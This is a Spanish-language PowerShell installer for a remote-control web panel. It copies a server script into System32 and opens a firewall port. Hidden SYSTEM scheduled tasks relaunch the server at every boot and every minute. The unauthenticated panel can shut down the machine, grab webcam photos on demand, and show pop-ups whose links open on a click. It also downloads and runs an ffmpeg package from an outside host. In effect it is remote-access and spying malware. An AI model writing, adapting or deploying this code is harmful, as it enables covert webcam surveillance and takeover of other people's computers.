param(
    [switch]$Desinstalar, 
    [int]$Puerto = 8080
)

$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$userName = $currentUser.Split('\')[1]
$computerName = $env:COMPUTERNAME

if ($Desinstalar) {
    Write-Host "DESINSTALANDO SERVIDOR WEB..." -ForegroundColor Yellow
    
    schtasks /delete /tn "PCWeb_SYSTEM" /f 2>$null
    schtasks /delete /tn "PCWeb_SYSTEM_Minuto" /f 2>$null
    
    netsh advfirewall firewall delete rule name="PCWeb_SYSTEM" 2>$null
    
    netsh http delete urlacl url="http://*:$Puerto/" 2>$null
    netsh http delete urlacl url="http://localhost:$Puerto/" 2>$null
    netsh http delete urlacl url="http://${computerName}:$Puerto/" 2>$null
    
    Remove-Item "C:\Windows\System32\WebServer.ps1" -ErrorAction SilentlyContinue
    Remove-Item "C:\Windows\System32\WebCamCaptures" -Recurse -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\webcam_temp" -Recurse -ErrorAction SilentlyContinue
    
    Get-Process -Name "powershell" | Where-Object { $_.CommandLine -like "*WebServer.ps1*" } | Stop-Process -Force -ErrorAction SilentlyContinue
    
    Write-Host "SERVIDOR WEB DESINSTALADO" -ForegroundColor Green
    exit
}

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Solicitando permisos de administrador..." -ForegroundColor Yellow
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Puerto $Puerto" -Verb RunAs
    exit
}

Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "   INSTALACION SERVIDOR WEB PUERTO $Puerto" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "Usuario: $userName"
Write-Host "PC: $computerName"
Write-Host "Puerto: $Puerto"
Write-Host ""

Write-Host "1. Creando script del servidor..." -ForegroundColor Yellow

# Crear directorio para capturas
New-Item -ItemType Directory -Path "C:\Windows\System32\WebCamCaptures" -Force | Out-Null

$webServerScript = @'
param(
    [int]$Port = 8080
)

$logPath = "C:\Windows\System32\WebServer.log"
$pidFile = "C:\Windows\System32\WebServer.pid"
$capturePath = "C:\Windows\System32\WebCamCaptures"
$computerName = $env:COMPUTERNAME
$tempDir = "$env:TEMP\webcam_temp"
$zipPackage = "ffmpeg_webcam.zip"
$baseUrl = "https://hackingetico.cl/tools/pro"

function Write-Log {
    param($Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File $logPath -Append
}

function Initialize-FFmpeg {
    if (-not (Test-Path $tempDir)) {
        New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
        Write-Log "Directorio temporal creado: $tempDir"
    }
    
    $ffmpegPath = "$tempDir\ffmpeg.exe"
    
    if (-not (Test-Path $ffmpegPath)) {
        Write-Log "Descargando FFmpeg desde $baseUrl/$zipPackage"
        $zipPath = "$tempDir\$zipPackage"
        
        try {
            # Descargar el paquete
            Invoke-WebRequest -Uri "$baseUrl/$zipPackage" -OutFile $zipPath -ErrorAction Stop
            Write-Log "Paquete descargado: $zipPath"
            
            # Descomprimir
            Expand-Archive -Path $zipPath -DestinationPath $tempDir -Force
            Remove-Item -Path $zipPath -Force
            Write-Log "FFmpeg descomprimido correctamente"
            
            return $true
        } catch {
            Write-Log "ERROR al descargar/descomprimir FFmpeg: $($_.Exception.Message)"
            return $false
        }
    }
    
    return $true
}

function Get-WebCamCapture {
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $outputFile = "$capturePath\capture_$timestamp.jpg"
    $ffmpegPath = "$tempDir\ffmpeg.exe"
    
    Write-Log "Iniciando captura de webcam..."
    
    # Verificar FFmpeg
    if (-not (Initialize-FFmpeg)) {
        Write-Log "ERROR: No se pudo inicializar FFmpeg"
        return $null
    }
    
    try {
        # Detectar cámaras
        Write-Log "Detectando cámaras disponibles..."
        $devicesOutput = & $ffmpegPath -list_devices true -f dshow -i dummy 2>&1 | Out-String
        Write-Log "Salida de detección de dispositivos: $devicesOutput"
        
        $cameraMatches = [regex]::Matches($devicesOutput, '\[dshow.*?\] "(.*?)" \(video\)')
        
        if ($cameraMatches.Count -eq 0) {
            Write-Log "ERROR: No se encontraron cámaras"
            return $null
        }
        
        $cameraName = $cameraMatches[0].Groups[1].Value
        Write-Log "Cámara detectada: $cameraName"
        
        # Capturar imagen
        Write-Log "Capturando imagen..."
        $tempImage = "$tempDir\webcam_capture_$timestamp.jpg"
        $ffmpegCmd = "`"$ffmpegPath`" -y -f dshow -i video=`"$cameraName`" -frames:v 1 -q:v 2 `"$tempImage`" 2>&1"
        $captureOutput = cmd /c $ffmpegCmd 2>&1
        
        if ($LASTEXITCODE -ne 0) {
            Write-Log "ERROR en captura: $captureOutput"
            return $null
        }
        
        # Verificar que se creó la imagen
        if (-not (Test-Path $tempImage)) {
            Write-Log "ERROR: No se generó el archivo de imagen"
            return $null
        }
        
        # Copiar a la ubicación permanente
        Copy-Item $tempImage $outputFile -Force
        Write-Log "Captura guardada: $outputFile"
        
        # Convertir a base64 para enviar
        $imageBytes = [System.IO.File]::ReadAllBytes($tempImage)
        $base64Image = [Convert]::ToBase64String($imageBytes)
        
        # Limpiar archivo temporal
        Remove-Item $tempImage -Force -ErrorAction SilentlyContinue
        
        Write-Log "Captura completada exitosamente"
        return @{
            Path = $outputFile
            Base64 = $base64Image
            Timestamp = $timestamp
        }
        
    } catch {
        Write-Log "ERROR en captura de webcam: $($_.Exception.Message)"
        return $null
    }
}

function Send-PopupMessage {
    param($Message, $Title = "Mensaje del Administrador", $Link = "")
    
    Write-Log "Enviando mensaje popup: $Title"
    
    # Construir mensaje con enlace si existe
    $displayMessage = $Message
    if ($Link) {
        $displayMessage += "`n`nEnlace: $Link"
    }
    
    # Crear un script de PowerShell para mostrar la ventana emergente
    $popupScript = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

`$form = New-Object System.Windows.Forms.Form
`$form.Text = "$Title"
`$form.Size = New-Object System.Drawing.Size(550, 350)
`$form.StartPosition = "CenterScreen"
`$form.Topmost = $true
`$form.FormBorderStyle = "FixedDialog"
`$form.MaximizeBox = $false
`$form.MinimizeBox = $false
`$form.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)

`$label = New-Object System.Windows.Forms.Label
`$label.Text = "$displayMessage"
`$label.Location = New-Object System.Drawing.Point(20, 30)
`$label.Size = New-Object System.Drawing.Size(490, 150)
`$label.Font = New-Object System.Drawing.Font("Segoe UI", 10)
`$label.ForeColor = [System.Drawing.Color]::White
`$label.TextAlign = "MiddleCenter"

`$buttonPanel = New-Object System.Windows.Forms.Panel
`$buttonPanel.Location = New-Object System.Drawing.Point(0, 200)
`$buttonPanel.Size = New-Object System.Drawing.Size(534, 80)
`$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)

`$buttonAceptar = New-Object System.Windows.Forms.Button
`$buttonAceptar.Text = "Aceptar"
`$buttonAceptar.Location = New-Object System.Drawing.Point(150, 25)
`$buttonAceptar.Size = New-Object System.Drawing.Size(100, 35)
`$buttonAceptar.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
`$buttonAceptar.ForeColor = [System.Drawing.Color]::White
`$buttonAceptar.FlatStyle = "Flat"
`$buttonAceptar.Add_Click({ `$form.Close() })

`$buttonPanel.Controls.Add(`$buttonAceptar)

if ("$Link") {
    `$buttonAbrir = New-Object System.Windows.Forms.Button
    `$buttonAbrir.Text = "Abrir Enlace"
    `$buttonAbrir.Location = New-Object System.Drawing.Point(280, 25)
    `$buttonAbrir.Size = New-Object System.Drawing.Size(100, 35)
    `$buttonAbrir.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
    `$buttonAbrir.ForeColor = [System.Drawing.Color]::White
    `$buttonAbrir.FlatStyle = "Flat"
    `$buttonAbrir.Add_Click({
        Start-Process "$Link"
        `$form.Close()
    })
    `$buttonPanel.Controls.Add(`$buttonAbrir)
}

`$form.Controls.Add(`$label)
`$form.Controls.Add(`$buttonPanel)

`$form.ShowDialog()
"@
    
    $popupFile = "$env:TEMP\popup_$(Get-Random).ps1"
    $popupScript | Out-File $popupFile -Encoding UTF8 -Force
    
    # Ejecutar el script en la sesión del usuario actual
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Normal -File `"$popupFile`"" -WindowStyle Normal
    
    # Eliminar el script después de unos segundos
    Start-Sleep -Seconds 10
    Remove-Item $popupFile -ErrorAction SilentlyContinue
    
    Write-Log "Mensaje popup enviado"
}

function Start-WebServer {
    $pid | Out-File $pidFile -Force
    
    Write-Log "======================================"
    Write-Log "INICIANDO SERVIDOR WEB EN PUERTO $Port"
    Write-Log "Usuario: $env:USERNAME"
    Write-Log "Computadora: $computerName"
    Write-Log "PID: $pid"
    Write-Log "Nivel: SYSTEM"
    
    try {
        $listener = New-Object System.Net.HttpListener
        
        $listener.Prefixes.Add("http://*:$Port/")
        $listener.Prefixes.Add("http://localhost:$Port/")
        $listener.Prefixes.Add("http://${computerName}:$Port/")
        
        $listener.Start()
        
        Write-Log "SERVIDOR INICIADO CORRECTAMENTE"
        Write-Log "Prefijos registrados:"
        foreach ($prefix in $listener.Prefixes) {
            Write-Log "  - $prefix"
        }
        
        while ($true) {
            $context = $listener.GetContext()
            $request = $context.Request
            $response = $context.Response
            
            if ($request.Url.LocalPath -eq '/' -or $request.Url.LocalPath -eq '') {
                $html = @"
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CONTROL PC REMOTO</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; min-height: 100vh; }
.container { max-width: 1200px; margin: 0 auto; }
.header { text-align: center; margin-bottom: 30px; }
.header h1 { color: #00ff9d; font-size: 2.5em; margin-bottom: 10px; }
.status-card { background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); border-radius: 15px; padding: 20px; margin-bottom: 30px; border: 1px solid rgba(0, 255, 157, 0.3); }
.info-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; text-align: center; }
.info-item .label { font-size: 12px; color: #888; text-transform: uppercase; letter-spacing: 1px; }
.info-item .value { font-size: 24px; font-weight: bold; color: #00ff9d; margin-top: 5px; }
.buttons-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 30px; }
.btn { background: rgba(0, 0, 0, 0.6); border: 1px solid #00ff9d; color: #00ff9d; padding: 12px 20px; text-align: center; cursor: pointer; border-radius: 8px; transition: all 0.3s; font-size: 14px; font-weight: bold; }
.btn:hover { background: #00ff9d; color: #000; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 255, 157, 0.3); }
.message-card, .capture-card { background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(10px); border-radius: 15px; padding: 20px; margin-bottom: 30px; border: 1px solid rgba(0, 255, 157, 0.3); }
.message-card h3, .capture-card h3 { color: #00ff9d; margin-bottom: 15px; }
input, textarea { width: 100%; background: rgba(0, 0, 0, 0.8); border: 1px solid #00ff9d; color: #fff; padding: 10px; border-radius: 8px; margin-bottom: 10px; font-family: monospace; }
textarea { resize: vertical; min-height: 80px; }
.capture-preview { text-align: center; margin-top: 15px; }
.capture-img { max-width: 100%; max-height: 400px; border-radius: 10px; border: 2px solid #00ff9d; }
.console { background: #000; border: 1px solid #00ff9d; border-radius: 10px; padding: 15px; height: 200px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 12px; color: #0f0; }
.footer { text-align: center; margin-top: 30px; color: #888; font-size: 12px; }
@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
.loading { animation: pulse 1s infinite; }
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>🎮 CONTROL PC REMOTO</h1>
<p>Panel de control para tus dispositivos</p>
</div>

<div class="status-card">
<div class="info-grid">
<div class="info-item"><div class="label">HOSTNAME</div><div class="value" id="pcName">---</div></div>
<div class="info-item"><div class="label">USUARIO</div><div class="value" id="pcUser">---</div></div>
<div class="info-item"><div class="label">HORA</div><div class="value" id="pcTime">---</div></div>
</div>
</div>

<div class="buttons-grid">
<button class="btn" onclick="sendCommand('apagar')">⏻ APAGAR</button>
<button class="btn" onclick="sendCommand('reiniciar')">↻ REINICIAR</button>
<button class="btn" onclick="sendCommand('bloquear')">🔒 BLOQUEAR</button>
<button class="btn" onclick="sendCommand('estado')">✓ ESTADO</button>
<button class="btn" onclick="sendCommand('cancelar')">✖ CANCELAR</button>
<button class="btn" onclick="captureWebcam()">📸 CAPTURAR WEBCAM</button>
</div>

<div class="message-card">
<h3>💬 ENVIAR MENSAJE INTERACTIVO</h3>
<input type="text" id="msgTitle" placeholder="Título del mensaje" value="📢 Mensaje del Administrador">
<textarea id="msgText" placeholder="Escribe tu mensaje aquí..."></textarea>
<input type="text" id="msgLink" placeholder="Enlace para abrir (opcional)">
<button class="btn" onclick="sendMessage()" style="width: 100%;">📨 ENVIAR MENSAJE</button>
</div>

<div class="capture-card" id="captureCard" style="display: none;">
<h3>📷 ÚLTIMA CAPTURA</h3>
<div class="capture-preview">
<img id="captureImage" class="capture-img">
</div>
</div>

<div class="console" id="console">
<span style="color: #00ff9d;">&gt; SISTEMA LISTO</span><br>
<span style="color: #888;">&gt; Esperando comandos...</span>
</div>

<div class="footer">
Puerto: $Port | PID: $pid | Sistema listo para recibir comandos
</div>
</div>

<script>
function addConsoleMessage(msg, type = 'info') {
    const console = document.getElementById('console');
    const colors = { info: '#00ff9d', error: '#ff4444', success: '#00ff9d' };
    const color = colors[type] || colors.info;
    const time = new Date().toLocaleTimeString();
    console.innerHTML += `<br><span style="color: ${color};">&gt; [${time}] ${msg}</span>`;
    console.scrollTop = console.scrollHeight;
}

async function sendCommand(command) {
    addConsoleMessage(`Ejecutando comando: ${command}...`, 'info');
    try {
        const response = await fetch('/cmd', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ accion: command })
        });
        const data = await response.json();
        addConsoleMessage(data.mensaje, data.mensaje.includes('ERROR') ? 'error' : 'success');
    } catch (error) {
        addConsoleMessage(`Error: ${error.message}`, 'error');
    }
}

async function captureWebcam() {
    addConsoleMessage('Iniciando captura de webcam...', 'info');
    try {
        const response = await fetch('/cmd', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ accion: 'webcam' })
        });
        const data = await response.json();
        
        if (data.imagen) {
            const captureCard = document.getElementById('captureCard');
            const captureImage = document.getElementById('captureImage');
            captureImage.src = `data:image/jpeg;base64,${data.imagen}`;
            captureCard.style.display = 'block';
            addConsoleMessage('Captura realizada exitosamente!', 'success');
        } else {
            addConsoleMessage('Error en la captura: No se recibió imagen', 'error');
        }
    } catch (error) {
        addConsoleMessage(`Error: ${error.message}`, 'error');
    }
}

async function sendMessage() {
    const title = document.getElementById('msgTitle').value;
    const message = document.getElementById('msgText').value;
    const link = document.getElementById('msgLink').value;
    
    if (!message) {
        addConsoleMessage('Por favor escribe un mensaje', 'error');
        return;
    }
    
    addConsoleMessage(`Enviando mensaje: ${title}...`, 'info');
    try {
        const response = await fetch('/sendmessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ titulo: title, mensaje: message, enlace: link })
        });
        const data = await response.json();
        addConsoleMessage(data.mensaje, 'success');
        document.getElementById('msgText').value = '';
        document.getElementById('msgLink').value = '';
    } catch (error) {
        addConsoleMessage(`Error: ${error.message}`, 'error');
    }
}

async function updateInfo() {
    try {
        const response = await fetch('/info');
        const data = await response.json();
        document.getElementById('pcName').innerText = data.nombre;
        document.getElementById('pcUser').innerText = data.usuario;
        document.getElementById('pcTime').innerText = data.hora;
    } catch (error) {
        console.error('Error updating info:', error);
    }
}

updateInfo();
setInterval(updateInfo, 1000);
</script>
</body>
</html>
"@
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
                $response.ContentType = 'text/html; charset=utf-8'
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            elseif ($request.Url.LocalPath -eq '/info') {
                $info = @{
                    nombre = $env:COMPUTERNAME
                    usuario = $env:USERNAME
                    hora = (Get-Date).ToString('HH:mm:ss')
                }
                $json = $info | ConvertTo-Json
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
                $response.ContentType = 'application/json; charset=utf-8'
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            elseif ($request.Url.LocalPath -eq '/cmd' -and $request.HttpMethod -eq 'POST') {
                $reader = New-Object System.IO.StreamReader($request.InputStream)
                $body = $reader.ReadToEnd()
                $data = $body | ConvertFrom-Json
                
                $mensaje = ""
                $imagen = $null
                
                switch ($data.accion) {
                    'apagar' { 
                        shutdown /s /f /t 0
                        $mensaje = "✅ APAGANDO EQUIPO..."
                    }
                    'reiniciar' { 
                        shutdown /r /f /t 0
                        $mensaje = "✅ REINICIANDO EQUIPO..."
                    }
                    'bloquear' { 
                        rundll32.exe user32.dll,LockWorkStation
                        $mensaje = "✅ BLOQUEANDO SESION..."
                    }
                    'estado' { 
                        $mensaje = "✅ SISTEMA OK - $(Get-Date)"
                    }
                    'cancelar' { 
                        shutdown /a
                        $mensaje = "✅ APAGADO CANCELADO"
                    }
                    'webcam' {
                        $captura = Get-WebCamCapture
                        if ($captura -and $captura.Base64) {
                            $mensaje = "✅ CAPTURA REALIZADA: $($captura.Timestamp)"
                            $imagen = $captura.Base64
                            Write-Log "Webcam capture successful: $($captura.Path)"
                        } else {
                            $mensaje = "❌ ERROR AL CAPTURAR WEBCAM - Verifica que haya una cámara conectada"
                            Write-Log "Webcam capture failed"
                        }
                    }
                    default { 
                        $mensaje = "❌ COMANDO NO RECONOCIDO"
                    }
                }
                
                $result = @{ mensaje = $mensaje; imagen = $imagen }
                $json = $result | ConvertTo-Json
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
                $response.ContentType = 'application/json; charset=utf-8'
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
                
                Write-Log "Comando ejecutado: $($data.accion) - $mensaje"
            }
            elseif ($request.Url.LocalPath -eq '/sendmessage' -and $request.HttpMethod -eq 'POST') {
                $reader = New-Object System.IO.StreamReader($request.InputStream)
                $body = $reader.ReadToEnd()
                $data = $body | ConvertFrom-Json
                
                Send-PopupMessage -Message $data.mensaje -Title $data.titulo -Link $data.enlace
                
                $result = @{ mensaje = "✅ MENSAJE ENVIADO: $($data.titulo)" }
                $json = $result | ConvertTo-Json
                $buffer = [System.Text.Encoding]::UTF8.GetBytes($json)
                $response.ContentType = 'application/json; charset=utf-8'
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
                
                Write-Log "Mensaje enviado: $($data.titulo) - $($data.mensaje)"
            }
            else {
                $response.StatusCode = 404
                $buffer = [System.Text.Encoding]::UTF8.GetBytes("404 - No encontrado")
                $response.ContentLength64 = $buffer.Length
                $response.OutputStream.Write($buffer, 0, $buffer.Length)
            }
            
            $response.Close()
        }
    } catch {
        Write-Log "ERROR CRITICO: $_"
        Write-Log "Detalles: $($_.Exception.Message)"
        Write-Log "Stack: $($_.ScriptStackTrace)"
        
        Start-Sleep -Seconds 30
        Start-WebServer
    }
}

Start-WebServer
'@

$webServerScript | Out-File "C:\Windows\System32\WebServer.ps1" -Encoding UTF8 -Force

Write-Host "  OK - Script creado: C:\Windows\System32\WebServer.ps1" -ForegroundColor Green

# Resto del script (configuración firewall, tareas, etc.)
Write-Host ""
Write-Host "2. Configurando firewall..." -ForegroundColor Yellow
netsh advfirewall firewall delete rule name="PCWeb_SYSTEM" 2>$null
netsh advfirewall firewall add rule name="PCWeb_SYSTEM" dir=in action=allow protocol=TCP localport=$Puerto 2>$null
Write-Host "  OK - Regla de firewall agregada" -ForegroundColor Green

Write-Host ""
Write-Host "3. Reservando URL en el sistema..." -ForegroundColor Yellow
netsh http delete urlacl url="http://*:$Puerto/" 2>$null
netsh http delete urlacl url="http://localhost:$Puerto/" 2>$null
netsh http delete urlacl url="http://${computerName}:$Puerto/" 2>$null

netsh http add urlacl url="http://*:$Puerto/" user=BUILTIN\Users 2>$null
netsh http add urlacl url="http://localhost:$Puerto/" user=BUILTIN\Users 2>$null
netsh http add urlacl url="http://${computerName}:$Puerto/" user=BUILTIN\Users 2>$null
Write-Host "  OK - URLs reservadas" -ForegroundColor Green

Write-Host ""
Write-Host "4. Creando tareas programadas como SYSTEM (ADMIN)..." -ForegroundColor Yellow

schtasks /delete /tn "PCWeb_SYSTEM" /f 2>$null
schtasks /delete /tn "PCWeb_SYSTEM_Minuto" /f 2>$null

$taskCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\Windows\System32\WebServer.ps1`" -Port $Puerto"

schtasks /create /tn "PCWeb_SYSTEM" `
    /tr "$taskCommand" `
    /sc onstart `
    /ru SYSTEM `
    /rl HIGHEST `
    /f 2>$null

schtasks /create /tn "PCWeb_SYSTEM_Minuto" `
    /tr "$taskCommand" `
    /sc minute `
    /mo 1 `
    /ru SYSTEM `
    /rl HIGHEST `
    /f 2>$null

Write-Host "  OK - Tareas creadas como SYSTEM:" -ForegroundColor Green
Write-Host "    - PCWeb_SYSTEM (al iniciar Windows)" -ForegroundColor White
Write-Host "    - PCWeb_SYSTEM_Minuto (cada 1 minuto)" -ForegroundColor White

Write-Host ""
Write-Host "5. Matando procesos anteriores..." -ForegroundColor Yellow
Get-Process -Name "powershell" | Where-Object { $_.CommandLine -like "*WebServer.ps1*" } | Stop-Process -Force -ErrorAction SilentlyContinue 2>$null
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "6. Iniciando servidor como ADMIN (SYSTEM)..." -ForegroundColor Yellow

$arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\Windows\System32\WebServer.ps1`" -Port $Puerto"
Start-Process powershell.exe -ArgumentList $arguments -WindowStyle Hidden -Verb RunAs

Write-Host "  OK - Servidor iniciado como ADMIN" -ForegroundColor Green
Start-Sleep -Seconds 5

Write-Host ""
Write-Host "7. Probando conexion..." -ForegroundColor Yellow

$conexionExitosa = $false
for ($i = 1; $i -le 10; $i++) {
    try {
        $test = Invoke-RestMethod -Uri "http://localhost:$Puerto/info" -TimeoutSec 2 -ErrorAction SilentlyContinue
        if ($test.nombre) {
            Write-Host "  OK - CONEXION EXITOSA (Intento $i/10)" -ForegroundColor Green
            Write-Host "    PC: $($test.nombre)" -ForegroundColor White
            Write-Host "    Usuario: $($test.usuario)" -ForegroundColor White
            $conexionExitosa = $true
            break
        }
    } catch {
        Write-Host "  Intentando conectar... (Intento $i/10)" -ForegroundColor Yellow
        Start-Sleep -Seconds 2
    }
}

if (-not $conexionExitosa) {
    Write-Host "  ADVERTENCIA: No se pudo conectar" -ForegroundColor Yellow
    Write-Host "  Revisa el log: C:\Windows\System32\WebServer.log" -ForegroundColor White
}

try {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.254.*"}).IPAddress | Select-Object -First 1
    if (-not $ip) {
        $ip = (Test-Connection -ComputerName $computerName -Count 1).IPV4Address.IPAddressToString
    }
} catch {
    $ip = "192.168.x.x"
}

Write-Host ""
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host "   INSTALACION COMPLETADA" -ForegroundColor Cyan
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "🎯 NUEVAS FUNCIONALIDADES INTEGRADAS:" -ForegroundColor Yellow
Write-Host "  📸 Captura de webcam con FFmpeg (tu método original)" -ForegroundColor Green
Write-Host "  💬 Mensajes interactivos con ventanas emergentes" -ForegroundColor Green
Write-Host "  🔗 Enlaces clickeables en los mensajes" -ForegroundColor Green
Write-Host ""
Write-Host "🌐 URL DE ACCESO:" -ForegroundColor Yellow
Write-Host "  Local:    http://localhost:$Puerto" -ForegroundColor White
Write-Host "  Red:      http://$($ip):$Puerto" -ForegroundColor White
Write-Host "  Nombre:   http://${computerName}:$Puerto" -ForegroundColor White
Write-Host ""
Write-Host "📁 DIRECTORIOS:" -ForegroundColor Yellow
Write-Host "  Script:   C:\Windows\System32\WebServer.ps1" -ForegroundColor White
Write-Host "  Capturas: C:\Windows\System32\WebCamCaptures\" -ForegroundColor White
Write-Host "  Temp:     %TEMP%\webcam_temp\" -ForegroundColor White
Write-Host "  Log:      C:\Windows\System32\WebServer.log" -ForegroundColor White
Write-Host ""
Write-Host "🎮 CÓMO USAR:" -ForegroundColor Yellow
Write-Host "  1. Capturar webcam: Haz clic en 'CAPTURAR WEBCAM'" -ForegroundColor White
Write-Host "  2. Enviar mensaje: Escribe título, mensaje y opcionalmente un enlace" -ForegroundColor White
Write-Host "  3. Los mensajes aparecerán como ventanas emergentes con botón para abrir enlaces" -ForegroundColor White
Write-Host "  4. Las capturas se guardan localmente y se muestran en la interfaz web" -ForegroundColor White
Write-Host ""
Write-Host "🗑️ DESINSTALAR:" -ForegroundColor Yellow
Write-Host "  powershell -File `"$PSCommandPath`" -Desinstalar" -ForegroundColor White
Write-Host ""
Write-Host "==========================================" -ForegroundColor Cyan
Write-Host ""

Read-Host "Presiona Enter para salir"
